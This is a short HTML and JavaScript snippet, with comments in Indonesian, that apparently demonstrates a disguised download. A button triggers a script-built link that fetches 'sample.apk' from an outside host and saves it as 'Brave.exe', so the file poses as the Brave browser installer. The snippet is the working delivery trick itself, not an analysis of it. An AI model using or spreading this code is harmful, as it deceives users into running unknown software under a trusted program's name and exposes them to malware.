<script>
function Puf(uri, name) {
  var link = document.createElement("a");
  link.download = name; // Catatan: bisa diabaikan jika URL cross-origin
  link.href = uri;
  document.body.appendChild(link);
  link.click();
  link.remove();
}

function openWin() {
  // Contoh dari google.com atau test.com
  Puf("http://rebelsec.id/sample.apk", "Brave.exe");
}
</script>

<input type="button" onclick="openWin();" value="open" />
